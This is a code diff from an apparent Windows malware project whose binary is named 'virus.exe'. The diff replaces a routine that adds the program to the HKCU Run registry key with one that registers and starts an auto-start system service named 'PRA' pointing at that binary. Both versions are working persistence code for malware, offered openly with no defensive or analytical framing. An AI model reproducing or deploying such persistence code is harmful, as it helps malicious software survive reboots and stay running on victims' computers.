@@ -5,34 +5,54 @@
 #include <stdio.h>
 #include <windows.h>
 
-const BYTE PATH[] = "\"C:\\Systems\\virus.exe\"";
-const int PATH_SIZE = sizeof(PATH);
+#define SC_NAME L"PRA"
 
-void add_to_startup()
+const WCHAR PATH_TO_BIN[] = L"\"C:\\Systems\\virus.exe\"";
+const int PATH_SIZE = sizeof(PATH_TO_BIN);
+
+void create_and_start_service()
 {
-    HKEY hkey;
-    
-    RegCreateKeyExA(
-        HKEY_CURRENT_USER,
-        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        0,
+    SC_HANDLE sc_manager_handle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+
+    if (sc_manager_handle == NULL)
+    {
+        printf("Cannot open SCManager\nError: %d", GetLastError());
+        return;
+    }
+
+    SC_HANDLE sc_handle = CreateService
+    (
+        sc_manager_handle,
+        SC_NAME,
+        SC_NAME,
+        SERVICE_ALL_ACCESS,
+        SERVICE_WIN32_OWN_PROCESS,
+        SERVICE_AUTO_START,
+        SERVICE_ERROR_NORMAL,
+        PATH_TO_BIN,
         NULL,
-        REG_OPTION_NON_VOLATILE,
-        (KEY_WRITE | KEY_READ),
         NULL,
-        &hkey,
+        NULL,
+        NULL,
         NULL
-   );
+    );
 
-    RegSetValueExA(
-        hkey,
-        "Virus",
-        0,
-        REG_SZ,
-        PATH,
-        PATH_SIZE
-   );
+    if ((sc_handle == NULL))
+    {
+        printf("sc_handle NULL\nError: %d", GetLastError());
+        CloseServiceHandle(sc_manager_handle);
+        return;
+    }
 
-   RegCloseKey(hkey);
-   return;
+    if (StartService(sc_handle, 0, NULL) == 0)
+    {
+        printf("Can`t start service\nError: %d", GetLastError());
+        CloseServiceHandle(sc_handle);
+        CloseServiceHandle(sc_manager_handle);
+        return;
+    }
+
+    CloseServiceHandle(sc_handle);
+    CloseServiceHandle(sc_manager_handle);
+    return;
 }
